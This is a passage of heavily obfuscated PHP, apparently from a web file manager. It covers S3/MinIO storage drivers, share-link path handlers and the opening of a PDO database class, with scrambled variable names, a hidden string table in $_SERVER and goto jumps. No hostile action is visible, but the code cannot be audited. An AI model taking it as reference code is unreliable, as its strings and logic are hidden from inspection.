$Éı‰…£´ = $this->objectMeta($É…„Óæú); if (!$Éı‰…£´) { return $Í½Ş²ºÛ; } } if (isset($Éı‰…£´[$Ÿ¾¸À€¦[203]])) { $Í½Ş²ºÛ[$Ÿ¾¸À€¦[85]] = $Éı‰…£´[$Ÿ¾¸À€¦[203]]; } if (isset($Éı‰…£´[$Ÿ¾¸À€¦[76]])) { $Í½Ş²ºÛ[$Ÿ¾¸À€¦[76]] = $Éı‰…£´[$Ÿ¾¸À€¦[76]]; } return $Í½Ş²ºÛ; } private function folderInfo($´Ò©³¨ò, $›£ÕŞà = false, $Ş¹®¡×¦ = array()) { $ºéè =& $_SERVER[ĞÂ¤àÓï]; $”ıÜø÷¥ = array($ºéè[32] => $this->pathThis($´Ò©³¨ò), $ºéè[84] => $this->getPathOuter($ºéè[8] . $´Ò©³¨ò), $ºéè[33] => $ºéè[75]); if ($›£ÕŞà) { return $”ıÜø÷¥; } $”ıÜø÷¥[$ºéè[200]] = $”ıÜø÷¥[$ºéè[85]] = 0; $”ıÜø÷¥[$ºéè[201]] = $”ıÜø÷¥[$ºéè[202]] = !0; if ($´Ò©³¨ò == $ºéè[12]) { return $”ıÜø÷¥; } if (empty($Ş¹®¡×¦)) { $Ş¹®¡×¦ = $this->objectMeta(trim($´Ò©³¨ò, $ºéè[8]) . $ºéè[8]); } if (isset($Ş¹®¡×¦[$ºéè[203]])) { $”ıÜø÷¥[$ºéè[200]] = $Ş¹®¡×¦[$ºéè[203]]; } return $”ıÜø÷¥; } private function fileList($¿ùğı¡‘, $êÑğşË° = '', $ËÒ²ŒìÙ = 0) { $æ¯Åí…® =& $_SERVER[ĞÂ¤àÓï]; $˜…‚„ßÛ = rtrim($¿ùğı¡‘, $æ¯Åí…®[8]) . $æ¯Åí…®[8]; $äÕ— ˆ˜ = $this->listObjs($˜…‚„ßÛ, null, null, $êÑğşË°); if (!$äÕ— ˆ˜) { return array($æ¯Åí…®[82] => array(), $æ¯Åí…®[83] => array()); } $¿É©ÈÂ¹ = $îäÏçú¢ = array(); foreach ($äÕ— ˆ˜[$æ¯Åí…®[204]] as $’ò×•´) { $¦ã•éÁ— = $’ò×•´[$æ¯Åí…®[32]]; if ($¦ã•éÁ— == $˜…‚„ßÛ) { continue; } $Ôş³®š¢ = isset($’ò×•´[$æ¯Åí…®[76]]) ? $’ò×•´[$æ¯Åí…®[76]] : 0; $•áè²Ç¾ = $Ôş³®š¢ == 0 && substr($¦ã•éÁ—, strlen($¦ã•éÁ—) - 1, 1) == $æ¯Åí…®[8] ? !0 : !1; $this->cacheMethodInfoSet($¦ã•éÁ—, $•áè²Ç¾, $’ò×•´); if ($•áè²Ç¾) { $¿É©ÈÂ¹[] = $¦ã•éÁ—; continue; } $îäÏçú¢[] = $ËÒ²ŒìÙ ? $’ò×•´ : $¦ã•éÁ—; } foreach ($äÕ— ˆ˜[$æ¯Åí…®[205]] as $’ò×•´) { $¿É©ÈÂ¹[] = $’ò×•´[$æ¯Åí…®[32]]; $this->cacheMethodInfoSet($’ò×•´[$æ¯Åí…®[32]], !0); } $this->cacheMethodInfoSet($¿ùğı¡‘, !0); return array($æ¯Åí…®[82] => $¿É©ÈÂ¹, $æ¯Åí…®[83] => $îäÏçú¢); } private function listObjs($’ÏùùË—, $ÓøËä† = null, $õÏğÇ¨± = null, $ò¿ßŠ‡† = null) { $Øşøµîì =& $_SERVER[ĞÂ¤àÓï]; $’ÏùùË— = trim($’ÏùùË—, $Øşøµîì[8]); $¡Û™ç¶ƒ = empty($’ÏùùË—) && $’ÏùùË— !== $Øşøµîì[197] ? $Øşøµîì[12] : $’ÏùùË— . $Øşøµîì[8]; return $this->client->getBucket($this->bucket, $¡Û™ç¶ƒ, $ÓøËä†, $õÏğÇ¨±, $ò¿ßŠ‡†, !0); } public function has($‡¦éÏúÛ, $ìí‚¢‹‡ = false, $ä úİ©‹ = true) { $¦âºÇü =& $_SERVER[ĞÂ¤àÓï]; $‡¦éÏúÛ = trim($‡¦éÏúÛ, $¦âºÇü[8]); $ÁÂÌ‰» = empty($‡¦éÏúÛ) && $‡¦éÏúÛ !== $¦âºÇü[197] ? $¦âºÇü[12] : $‡¦éÏúÛ . $¦âºÇü[8]; $¸›â¤¯Û = null; $å„İşîñ = 500; $¤òìÙ»å = $¦âºÇü[8]; $ƒªÃÔ‰ = $´“Å‘Ø = array(); while (!0) { $ûâÊ—ê = $this->listObjs($‡¦éÏúÛ, $¸›â¤¯Û, $å„İşîñ, $¤òìÙ»å); if (!$ûâÊ—ê) { break; } $¸›â¤¯Û = $ûâÊ—ê[$¦âºÇü[206]]; $’£Ñ¥ÎÁ = $ûâÊ—ê[$¦âºÇü[204]]; $Ñ”äøÌŸ = $ûâÊ—ê[$¦âºÇü[205]]; if (empty($’£Ñ¥ÎÁ) && empty($Ñ”äøÌŸ)) { break; } if (count($’£Ñ¥ÎÁ) == 1 && $’£Ñ¥ÎÁ[0][$¦âºÇü[32]] == $ÁÂÌ‰») { break; } if ($ìí‚¢‹‡) { if (count($’£Ñ¥ÎÁ)) { $’£Ñ¥ÎÁ = array_column($’£Ñ¥ÎÁ, $¦âºÇü[32]); $ƒªÃÔ‰ = array_merge($ƒªÃÔ‰, $’£Ñ¥ÎÁ); } if (count($Ñ”äøÌŸ)) { $Ñ”äøÌŸ = array_column($Ñ”äøÌŸ, $¦âºÇü[32]); $´“Å‘Ø = array_merge($´“Å‘Ø, $Ñ”äøÌŸ); } if ($¸›â¤¯Û === null) { break; } continue; } if ($ä úİ©‹) { if (!empty($’£Ñ¥ÎÁ)) { if (count($’£Ñ¥ÎÁ) > 1 || isset($’£Ñ¥ÎÁ[0][$¦âºÇü[32]]) && $’£Ñ¥ÎÁ[0][$¦âºÇü[32]] != $ÁÂÌ‰») { return !0; } } } else { if (!empty($Ñ”äøÌŸ)) { return !0; } } if ($¸›â¤¯Û === null) { break; } } if ($ìí‚¢‹‡) { $ƒªÃÔ‰ = array_diff($ƒªÃÔ‰, array($ÁÂÌ‰»)); $ƒªÃÔ‰ = count(array_unique($ƒªÃÔ‰)); $´“Å‘Ø = count(array_unique($´“Å‘Ø)); return array($¦âºÇü[207] => $ƒªÃÔ‰, $¦âºÇü[208] => $´“Å‘Ø); } return !1; } public function listAll($¹Ø‚²ë) { $§¹Ù§Êƒ =& $_SERVER[ĞÂ¤àÓï]; $ßÂ î—Ñ = $this->fileList($¹Ø‚²ë, $§¹Ù§Êƒ[12], !0); $ıû—…üÌ = array(); foreach ($ßÂ î—Ñ[$§¹Ù§Êƒ[83]] as $Üã÷§àÙ) { $ıû—…üÌ[$Üã÷§àÙ[$§¹Ù§Êƒ[32]]] = $Üã÷§àÙ[$§¹Ù§Êƒ[76]]; } foreach ($ßÂ î—Ñ[$§¹Ù§Êƒ[82]] as $Üã÷§àÙ) { if (is_string($Üã÷§àÙ)) { $ıû—…üÌ[$Üã÷§àÙ] = 0; } } return $this->listAllFiles($¹Ø‚²ë, array_keys($ıû—…üÌ), $ıû—…üÌ); } public function canRead($Œ½Ñº™È) { $âòÂİ‚ =& $_SERVER[ĞÂ¤àÓï]; $ôŒ˜Îìö = $this->client->getAccessControlPolicy($this->bucket, $Œ½Ñº™È); if (!$ôŒ˜Îìö) { return !1; } return in_array($ôŒ˜Îìö, array($âòÂİ‚[209], $âòÂİ‚[210], $âòÂİ‚[211])) ? !0 : !1; } public function canWrite($öÏÖ€…) { $¬­Çà¡° =& $_SERVER[ĞÂ¤àÓï]; $¸ˆ›Ä = $this->client->getAccessControlPolicy($this->bucket, $öÏÖ€…); if (!$¸ˆ›Ä) { return !1; } return in_array($¸ˆ›Ä, array($¬­Çà¡°[209], $¬­Çà¡°[210])) ? !0 : !1; } public function getContent($¿Ş»´ÆÒ) { return $this->client->getObject($this->bucket, $¿Ş»´ÆÒ); } public function setContent($¸¤„”øÒ, $“Î–¿ª… = '', $µÆèğõµ = false) { $ıÂ›ÍËÂ =& $_SERVER[ĞÂ¤àÓï]; $¸¤„”øÒ = $µÆèğõµ ? trim($¸¤„”øÒ, $ıÂ›ÍËÂ[8]) . $ıÂ›ÍËÂ[8] : $¸¤„”øÒ; $ßÖ«£­Õ = get_file_mime(get_path_ext($¸¤„”øÒ)); $Ò¦ÁÊÚ« = $this->client->putObject($“Î–¿ª…, $this->bucket, $¸¤„”øÒ, $ıÂ›ÍËÂ[198], array(), $ßÖ«£­Õ); if (!$Ò¦ÁÊÚ«) { return !1; } if ($µÆèğõµ) { return !0; } $this->cacheMethod(null, null); $Ò¦ÁÊÚ« = $this->copyFile($¸¤„”øÒ, $¸¤„”øÒ, array($ıÂ›ÍËÂ[212] => $Ò¦ÁÊÚ«[$ıÂ›ÍËÂ[213]])); return $Ò¦ÁÊÚ« ? !0 : !1; } public function fileSubstr($ÖõÈ¹å½, $Á£‡˜ƒì, $£ÜØ¯´¯) { $ñğ­ú‚ = $Á£‡˜ƒì + $£ÜØ¯´¯ - 1; return $this->client->getObject($this->bucket, $ÖõÈ¹å½, array($_SERVER[ĞÂ¤àÓï][214] => "\142\x79\164\x65\x73\75{$Á£‡˜ƒì}\55{$ñğ­ú‚}")); } public function upload($şºÎ˜•, $êÉ‹ïª¹, $³èœ”®õ = false, $¼÷–Şè× = REPEAT_REPLACE) { $Àåİƒì» =& $_SERVER[ĞÂ¤àÓï]; $øˆÛªã = array($Àåİƒì»[212] => @md5_file($êÉ‹ïª¹)); $àÄÚ¤¡ = array($Àåİƒì»[215] => get_file_mime(get_path_ext($şºÎ˜•))); if (IO::size($êÉ‹ïª¹) <= 1024 * 1024 * 200) { $¸Ë‹àö® = $this->client->putObjectFile($êÉ‹ïª¹, $this->bucket, $şºÎ˜•, $Àåİƒì»[198], $øˆÛªã, $àÄÚ¤¡); return !empty($¸Ë‹àö®) ? $this->getPathOuter($şºÎ˜•) : !1; } $Ïœ‹÷¨ø = $this->client->multiUploadObject($êÉ‹ïª¹, $this->bucket, trim($şºÎ˜•, $Àåİƒì»[8]), $øˆÛªã, $àÄÚ¤¡); return $Ïœ‹÷¨ø ? $this->getPathOuter($şºÎ˜•) : !1; } public function download($ÏïŒüğ, $ÇÊìÊ¶) { if (!@is_dir($this->pathFather($ÇÊìÊ¶)) && !IO::mkdir($this->pathFather($ÇÊìÊ¶))) { return !1; } $ê•úòÑ™ = $this->client->getObject($this->bucket, $ÏïŒüğ, array(), $ÇÊìÊ¶); return $ê•úòÑ™ !== !1 ? $ÇÊìÊ¶ : !1; } public function link($’ë“Óø», $ÅºîÆì = array()) { $ªß›êÁ =& $_SERVER[ĞÂ¤àÓï]; if ($this->signVer == $ªß›êÁ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $’ë“Óø», 3600 * 12, $ÅºîÆì); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($’ë“Óø», $ªß›êÁ[8]), 3600 * 12, $this->region, array(), !0, $ÅºîÆì); } public function fileOut($”ÌşŞò×, $Í¹õ“˜Ì = false, $ñªà®¯Ë = false, $ìŞÜäÈß = '') { $‡Âíœ±‰ =& $_SERVER[ĞÂ¤àÓï]; if ($this->isFileOutServer()) { return $this->fileOutServer($”ÌşŞò×, $Í¹õ“˜Ì, $ñªà®¯Ë, $ìŞÜäÈß); } if (!$ñªà®¯Ë) { $ñªà®¯Ë = $this->pathThis($”ÌşŞò×); } $İ›Ÿ¥ = get_file_mime(get_path_ext($ñªà®¯Ë)); if ($İ›Ÿ¥ == $‡Âíœ±‰[217]) { return parent::fileOut($”ÌşŞò×, $Í¹õ“˜Ì, $ñªà®¯Ë, $ìŞÜäÈß); } $ûİÀÂ£ = array($‡Âíœ±‰[218] => $İ›Ÿ¥); if ($Í¹õ“˜Ì) { $ûİÀÂ£[$‡Âíœ±‰[219]] = $‡Âíœ±‰[220] . rawurlencode($ñªà®¯Ë); } else { } $¦—ü“ğ• = $this->link($”ÌşŞò×, $ûİÀÂ£); $this->fileOutLink($¦—ü“ğ•); } public function fileOutServer($€¼È£Æ, $š÷ÎÇ‡ã = false, $Ä¨Êóûë = false, $Ï´üæ = '') { parent::fileOut($€¼È£Æ, $š÷ÎÇ‡ã, $Ä¨Êóûë, $Ï´üæ); } public function fileOutImageServer($Ö“ƒË¨, $æÙÏéª’ = 250) { parent::fileOutImage($Ö“ƒË¨, $æÙÏéª’); } public function hashMd5($Ú…½¶öİ, $¦æ…ÙÑ¡ = '') { $²ß…à¤ =& $_SERVER[ĞÂ¤àÓï]; $¶ÊİóÖÑ = $this->objectMeta($Ú…½¶öİ); if (!$¶ÊİóÖÑ) { return !1; } $¦æ…ÙÑ¡ = $¦æ…ÙÑ¡ ? $¦æ…ÙÑ¡ : _get($¶ÊİóÖÑ, $²ß…à¤[221]); $¦æ…ÙÑ¡ = $¦æ…ÙÑ¡ ? $¦æ…ÙÑ¡ : _get($¶ÊİóÖÑ, $²ß…à¤[213], $²ß…à¤[12]); return $¦æ…ÙÑ¡; } public function uploadFormData($ôÄÊ¡¡É, $²ª´ù¸ = 3600) { $´íÎó• =& $_SERVER[ĞÂ¤àÓï]; $üê¿÷Ù‘ = $this->pathFather($ôÄÊ¡¡É); $Ç Îí = $this->client->getHttpUploadPostParams($this->bucket, $üê¿÷Ù‘, $´íÎó•[198], $²ª´ù¸); return array_merge((array) $Ç Îí, array($´íÎó•[181] => $this->getHost())); } public function multiUploadFormData($ÆÄ¦ÑÆƒ, $æŞ¦ÀÉ“ = 3600) { $õÚ¯Ô‰ =& $_SERVER[ĞÂ¤àÓï]; $ªù¹şŞ = gmdate($õÚ¯Ô‰[222]); $£ñÑÉ·í = array(); $µËØĞÚ = $this->client->getUploadId($this->bucket, $ÆÄ¦ÑÆƒ, $£ñÑÉ·í); if (!$µËØĞÚ) { return !1; } return array($õÚ¯Ô‰[223] => $µËØĞÚ, $õÚ¯Ô‰[181] => $this->getHost() . $õÚ¯Ô‰[8] . $this->pathEncode($ÆÄ¦ÑÆƒ), $õÚ¯Ô‰[224] => $ªù¹şŞ, $õÚ¯Ô‰[94] => $ÆÄ¦ÑÆƒ); } public function multiUploadAuthData($¤×àğ„¶, $éôÌÜÓ¤ = array()) { $ŠÀÌò°¨ =& $_SERVER[ĞÂ¤àÓï]; $‰•Ÿšà¤ = isset($éôÌÜÓ¤[$ŠÀÌò°¨[224]]) ? $éôÌÜÓ¤[$ŠÀÌò°¨[224]] : gmdate($ŠÀÌò°¨[222]); $Ñ¼œÙ€” = isset($éôÌÜÓ¤[$ŠÀÌò°¨[174]]) ? $éôÌÜÓ¤[$ŠÀÌò°¨[174]] : $ŠÀÌò°¨[12]; $ªŒ‡¢Á = $éôÌÜÓ¤[$ŠÀÌò°¨[94]]; unset($éôÌÜÓ¤[$ŠÀÌò°¨[94]]); if (isset($éôÌÜÓ¤[$ŠÀÌò°¨[225]])) { $éôÌÜÓ¤[$ŠÀÌò°¨[224]] = $‰•Ÿšà¤; return $this->listUploadParts($ªŒ‡¢Á, $éôÌÜÓ¤); } $Ü©İªÍÄ = array($ŠÀÌò°¨[226], $ŠÀÌò°¨[12], $ŠÀÌò°¨[120], $ŠÀÌò°¨[12], "\170\x2d\141\x6d\172\55\144\141\164\145\x3a{$‰•Ÿšà¤}", $ŠÀÌò°¨[8] . $this->bucket . $ŠÀÌò°¨[8] . $this->pathEncode($ªŒ‡¢Á) . $Ñ¼œÙ€”); if (strpos($Ñ¼œÙ€”, $ŠÀÌò°¨[227]) === 0) { $Ü©İªÍÄ[0] = $ŠÀÌò°¨[228]; } if (isset($éôÌÜÓ¤[$ŠÀÌò°¨[229]]) && $éôÌÜÓ¤[$ŠÀÌò°¨[229]] == $ŠÀÌò°¨[230]) { $Ü©İªÍÄ[0] = $ŠÀÌò°¨[230]; } $±ëÔçòÊ = implode($ŠÀÌò°¨[231], $Ü©İªÍÄ); $Šî‘úê = base64_encode(hash_hmac($ŠÀÌò°¨[232], $±ëÔçòÊ, $this->secret, !0)); $Óš¾ê¥¥ = $ŠÀÌò°¨[233] . $this->accessKey . $ŠÀÌò°¨[4] . $Šî‘úê; if (strpos($Ñ¼œÙ€”, $ŠÀÌò°¨[227]) === 0) { return array($ŠÀÌò°¨[234] => $Óš¾ê¥¥, $ŠÀÌò°¨[224] => $‰•Ÿšà¤); } return $Óš¾ê¥¥; } public function listUploadParts($«à·Á, $ö¹´Ñœ¸ = array()) { $Æª÷§ıª =& $_SERVER[ĞÂ¤àÓï]; $¾îˆĞÉ = str_replace($Æª÷§ıª[235], $Æª÷§ıª[12], $ö¹´Ñœ¸[$Æª÷§ıª[174]]); $ôââÒ®À = $this->client->listParts($this->bucket, $«à·Á, $¾îˆĞÉ); if (!$ôââÒ®À) { return !1; } unset($ö¹´Ñœ¸[$Æª÷§ıª[225]], $ö¹´Ñœ¸[$Æª÷§ıª[229]]); $ö¹´Ñœ¸[$Æª÷§ıª[94]] = $«à·Á; $¿á‚Äë‰ = $this->multiUploadAuthData($«à·Á, $ö¹´Ñœ¸); if (empty($¿á‚Äë‰)) { return !1; } return array($Æª÷§ıª[234] => $¿á‚Äë‰, $Æª÷§ıª[224] => $ö¹´Ñœ¸[$Æª÷§ıª[224]], $Æª÷§ıª[236] => $ôââÒ®À); } public function getHost() { return parent::getHost() . $_SERVER[ĞÂ¤àÓï][8] . $this->bucket; } public function size($¥ÄÈÀåğ) { $¶ˆÔÈª = $this->objectMeta($¥ÄÈÀåğ); return $¶ˆÔÈª ? $¶ˆÔÈª[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function info($âû†Á§È) { if ($this->isFolder($âû†Á§È)) { return $this->folderInfo($âû†Á§È); } else { if ($this->isFile($âû†Á§È)) { return $this->fileInfo($âû†Á§È); } } return !1; } public function exist($şÁí€éÄ) { return $this->isFile($şÁí€éÄ) || $this->isFolder($şÁí€éÄ); } public function isFile($ı¬äğëÉ) { return !$this->isFolder($ı¬äğëÉ) && $this->objectMeta($ı¬äğëÉ); } public function isFolder($Úñ¾¥Ò) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][165], $Úñ¾¥Ò); } protected function objectMeta($ù²ßÄ„¸) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][167], $ù²ßÄ„¸); } protected function _objectMeta($†ıŞŸªË) { $¢˜÷µ§ =& $_SERVER[ĞÂ¤àÓï]; $†ıŞŸªË = rtrim($†ıŞŸªË, $¢˜÷µ§[8]); try { $ÌÆ®¨É— = $this->client->getObjectInfo($this->bucket, $†ıŞŸªË); if (!isset($ÌÆ®¨É—[$¢˜÷µ§[221]]) && isset($ÌÆ®¨É—[$¢˜÷µ§[237]])) { $ÌÆ®¨É—[$¢˜÷µ§[221]] = $ÌÆ®¨É—[$¢˜÷µ§[237]]; } } catch (Exception $‰Éåüã) { $ÌÆ®¨É— = !1; } if (!$ÌÆ®¨É—) { } return $ÌÆ®¨É—; } protected function _isFolder($Òâå¹Ù) { $õ¹ŸØ­ =& $_SERVER[ĞÂ¤àÓï]; $Òâå¹Ù = rtrim($Òâå¹Ù, $õ¹ŸØ­[8]); if ($Òâå¹Ù == $õ¹ŸØ­[12] || $Òâå¹Ù == $õ¹ŸØ­[8]) { return !0; } $º”—İİú = $this->client->getBucket($this->bucket, $Òâå¹Ù, null, 1); if (empty($º”—İİú[$õ¹ŸØ­[204]])) { return !1; } $ˆôóéÓØ = $º”—İİú[$õ¹ŸØ­[204]][0][$õ¹ŸØ­[32]]; return stripos($ˆôóéÓØ, $Òâå¹Ù . $õ¹ŸØ­[8]) === 0 ? !0 : !1; if (substr($ˆôóéÓØ, -1) == $õ¹ŸØ­[8]) { return !0; } if (get_path_this($ˆôóéÓØ) == get_path_this($Òâå¹Ù)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($”òã¥ˆ‡) { parent::__construct($”òã¥ˆ‡); $this->signatureVersion($_SERVER[ĞÂ¤àÓï][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto dé©Å°–“«; e§§àËÒø: define($_SERVER[ĞÂ¤àÓï][241], 1); define($_SERVER[ĞÂ¤àÓï][242], 0); define($_SERVER[ĞÂ¤àÓï][243], 2); goto b†¾ˆÜ¸õÆ; câ·œò…: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Û¾œµ‡ö) { $this->pathParse = $Û¾œµ‡ö; $this->model = Model($_SERVER[ĞÂ¤àÓï][1336]); } protected function infoParse($íÁ×Şı, $»Çèûå¡ = false, $÷ôşóØİ = false) { $¸¶±Øö =& $_SERVER[ĞÂ¤àÓï]; return Action($¸¶±Øö[1175])->sharePathInfo($this->pathParse[$¸¶±Øö[84]], !0, $»Çèûå¡); } public function listPath($µ–°®¸‚, $ê¢«§é = false) { $ª‡±€¥ =& $_SERVER[ĞÂ¤àÓï]; $œ¦Å ë = parent::listPath($µ–°®¸‚, $ê¢«§é); if (!$œ¦Å ë) { return $œ¦Å ë; } if (is_array($œ¦Å ë[$ª‡±€¥[1345]])) { $œ¦Å ë[$ª‡±€¥[1345]] = Action($ª‡±€¥[1175])->shareItemInfo($œ¦Å ë[$ª‡±€¥[1345]]); } foreach ($œ¦Å ë as $†íŸ¶¢† => $¾ı‰ÛÙ–) { if (!in_array($†íŸ¶¢†, array($ª‡±€¥[83], $ª‡±€¥[82]))) { continue; } foreach ($¾ı‰ÛÙ– as $Ÿ…°ÌÏ => $ÎéÉ¬ÖÂ) { $œ¦Å ë[$†íŸ¶¢†][$Ÿ…°ÌÏ] = Action($ª‡±€¥[1175])->shareItemInfo($ÎéÉ¬ÖÂ); } } return $œ¦Å ë; } public function listAll($ÁŞÕŸÖä) { $âš­¡Š« =& $_SERVER[ĞÂ¤àÓï]; $ŸÖ£Ìì¦ = IO::info($this->pathParse[$âš­¡Š«[84]]); if (!$ŸÖ£Ìì¦) { return array(); } $ôüâüã = $this->model->listAll($ÁŞÕŸÖä); foreach ($ôüâüã as &$Åğ’¾ˆâ) { $Åğ’¾ˆâ[$âš­¡Š«[86]] = Action($âš­¡Š«[1175])->shareItemInfo($Åğ’¾ˆâ[$âš­¡Š«[86]]); } unset($Åğ’¾ˆâ); return $ôüâüã; } } class PathDriverDriverShareItem { public function __construct($Û¼âƒ­ç) { $this->pathParse = $Û¼âƒ­ç; } public function __call($Ï€³·°í, $´ÏïüşŠ) { $°ëäş• =& $_SERVER[ĞÂ¤àÓï]; if (method_exists($this, $Ï€³·°í)) { return; } $çä³•È = call_user_func_array(array($°ëäş•[1346], $Ï€³·°í), $´ÏïüşŠ); $¶öË‚˜ = array($°ëäş•[1347], $°ëäş•[1348], $°ëäş•[1349], $°ëäş•[1350], $°ëäş•[555], $°ëäş•[557], $°ëäş•[1351], $°ëäş•[107], $°ëäş•[1352], $°ëäş•[1353]); if (in_array($Ï€³·°í, $¶öË‚˜)) { $çä³•È = $this->getPathOuter($çä³•È); } return $çä³•È; } public function copy($¦Ï¤Ş±ı, $ÍÊâ¿¼à, $ıÇ—¬³ú = false, $ñÀéÔ„¾ = false) { return $this->copyMove($¦Ï¤Ş±ı, $ÍÊâ¿¼à, $ıÇ—¬³ú, $_SERVER[ĞÂ¤àÓï][555], $ñÀéÔ„¾); } public function move($³ûÃ±Œâ, $ñ‹„î½, $ó¦“üÔõ = false, $Œ°ğ§«à = false) { return $this->copyMove($³ûÃ±Œâ, $ñ‹„î½, $ó¦“üÔõ, $_SERVER[ĞÂ¤àÓï][557], $Œ°ğ§«à); } private function copyMove($Û·•”, $šˆö˜êå, $»¨İûŞ, $¬ˆ‚Üõ, $ÜØ¼Ö…± = false) { $Úì¸¿Ô =& $_SERVER[ĞÂ¤àÓï]; $¹ï‚œš— = $šˆö˜êå; $‰£ûË² = IO::driverMake($šˆö˜êå); if ($‰£ûË²->pathParse[$Úì¸¿Ô[1151]]) { $šˆö˜êå = $‰£ûË²->pathParse[$Úì¸¿Ô[1151]]; } else { $šˆö˜êå = $¹ï‚œš—; } $µ•”ÎŠ÷ = IO::copyMove($Û·•”, $šˆö˜êå, $»¨İûŞ, $¬ˆ‚Üõ, $ÜØ¼Ö…±); $µ•”ÎŠ÷ = $this->getPathOuter($µ•”ÎŠ÷); return $µ•”ÎŠ÷; } public function pathThis($»Å±ÑÂí) { return get_path_this($this->pathParse[$_SERVER[ĞÂ¤àÓï][84]]); } public function pathFather($í¾âõÃ˜) { return get_path_father($this->pathParse[$_SERVER[ĞÂ¤àÓï][84]]); } public function iconvSystem($°È³Î´™) { return $°È³Î´™; } protected function infoParse($ûâ–é¬®, $¥¾ˆ÷µÙ = false) { $şç¡šä =& $_SERVER[ĞÂ¤àÓï]; $û ‘«Û = $this->pathParse[$şç¡šä[487]][$şç¡šä[1176]] . $this->pathParse[$şç¡šä[1169]]; if ($¥¾ˆ÷µÙ) { $„Øóƒ­Œ = IO::infoWithChildren($û ‘«Û); } else { $„Øóƒ­Œ = IO::info($û ‘«Û); } $¢Ñ©öß = $this->pathParse[$şç¡šä[487]]; return Action($şç¡šä[1344])->_shareItemeParse($„Øóƒ­Œ, $¢Ñ©öß); } public function listAll($¯ÍçÍ¸‘) { $´¹Á½® =& $_SERVER[ĞÂ¤àÓï]; $Ÿ°„íÄŸ = IO::listAll($¯ÍçÍ¸‘); $Ä¯°ë¢ = $this->pathParse[$´¹Á½®[487]]; foreach ($Ÿ°„íÄŸ as &$ÀÀÊ…Š) { check_abort(); $°†‰üó¿ = IO::info($ÀÀÊ…Š[$´¹Á½®[84]]); $°†‰üó¿ = is_array($°†‰üó¿) ? $°†‰üó¿ : array(); $ÀÀÊ…Š = array_merge($°†‰üó¿, $ÀÀÊ…Š); $ÀÀÊ…Š[$´¹Á½®[86]] = Action($´¹Á½®[1344])->_shareItemeParse($ÀÀÊ…Š, $Ä¯°ë¢); } unset($ÀÀÊ…Š); return $Ÿ°„íÄŸ; } public function getPathOuter($Ö·„¬¨µ) { $øä—Œ˜§ =& $_SERVER[ĞÂ¤àÓï]; $ìÊñä‰¯ = KodIO::parse($Ö·„¬¨µ); if ($ìÊñä‰¯[$øä—Œ˜§[33]] == KodIO::KOD_SHARE_ITEM) { return $ìÊñä‰¯[$øä—Œ˜§[84]]; } $šÓéîØ = KodIO::clear($Ö·„¬¨µ); $Òµ´˜±¢ = KodIO::clear($this->pathParse[$øä—Œ˜§[487]][$øä—Œ˜§[1176]]); $³¿£ı¹ê = substr($šÓéîØ, strlen($Òµ´˜±¢)); if (substr($šÓéîØ, 0, strlen($Òµ´˜±¢)) != $Òµ´˜±¢) { return !1; } return $this->pathParse[$øä—Œ˜§[1170]] . $øä—Œ˜§[8] . ltrim($³¿£ı¹ê, $øä—Œ˜§[8]); } public function getType() { $é²Á¯á =& $_SERVER[ĞÂ¤àÓï]; $Ç”‡ş«Ü = str_replace($é²Á¯á[74], $é²Á¯á[12], get_class($this)); return strtolower($Ç”‡ş«Ü); } public function isTypeObject($ºä¶ùÌü) { return IO::isTypeObject($ºä¶ùÌü); } public function info($–±ñ¬œ) { return $this->infoParse($–±ñ¬œ); } public function infoAuth($È€†é²¿) { return $this->infoParse($È€†é²¿); } public function infoWithChildren($ş´ô¶) { return $this->infoParse($ş´ô¶, !0); } public function infoFull($ ¡­³Ù) { return $this->infoParse($ ¡­³Ù); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÓÊ¢˜ö) { $this->pathParse = $ÓÊ¢˜ö; } protected function infoParse($¤ûŠ µü, $Ÿ¬Õ‚ø£ = false) { $¢£¸”¾¤ =& $_SERVER[ĞÂ¤àÓï]; return Action($¢£¸”¾¤[1175])->sharePathInfo($this->pathParse[$¢£¸”¾¤[84]], !0, $Ÿ¬Õ‚ø£); } public function listPath($ø¬ÚÍ™ş, $ÊÏŞî‚ = false) { $©«¬İ«ù =& $_SERVER[ĞÂ¤àÓï]; $æ¢óÄ×ª = IO::listPath($ø¬ÚÍ™ş, $ÊÏŞî‚); if (!$æ¢óÄ×ª) { return $æ¢óÄ×ª; } if (is_array($æ¢óÄ×ª[$©«¬İ«ù[1345]])) { $îê®Ù²ç = Action($©«¬İ«ù[1354])->parsePathChildren($æ¢óÄ×ª[$©«¬İ«ù[1345]], array($©«¬İ«ù[421] => $ø¬ÚÍ™ş)); $æ¢óÄ×ª[$©«¬İ«ù[1345]] = Action($©«¬İ«ù[1175])->shareItemInfo($îê®Ù²ç); } foreach ($æ¢óÄ×ª as $Ş“¦Ã­á => $Ğ©²‡á”) { if (!in_array($Ş“¦Ã­á, array($©«¬İ«ù[83], $©«¬İ«ù[82]))) { continue; } foreach ($Ğ©²‡á” as $Òü¶óìÉ => $îê®Ù²ç) { $îê®Ù²ç = Action($©«¬İ«ù[1354])->parsePathChildren($îê®Ù²ç, array($©«¬İ«ù[421] => $ø¬ÚÍ™ş)); $æ¢óÄ×ª[$Ş“¦Ã­á][$Òü¶óìÉ] = Action($©«¬İ«ù[1175])->shareItemInfo($îê®Ù²ç); } } return $æ¢óÄ×ª; } public function listAll($¶ß±ı­—) { $±©È€÷Ô =& $_SERVER[ĞÂ¤àÓï]; $ÔÛÓƒˆ = IO::listAll($¶ß±ı­—); foreach ($ÔÛÓƒˆ as &$ö²”™Æ”) { $ãòåëÙË = IO::info($ö²”™Æ”[$±©È€÷Ô[84]]); $ãòåëÙË = is_array($ãòåëÙË) ? $ãòåëÙË : array(); $ö²”™Æ” = array_merge($ãòåëÙË, $ö²”™Æ”); $ö²”™Æ”[$±©È€÷Ô[86]] = Action($±©È€÷Ô[1175])->shareItemInfo($ö²”™Æ”); } unset($ö²”™Æ”); return $ÔÛÓƒˆ; } } goto B¼°ÁåäŠÁ; C‘”©ÌÇ©‘: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÅÍöÜ• = '') { 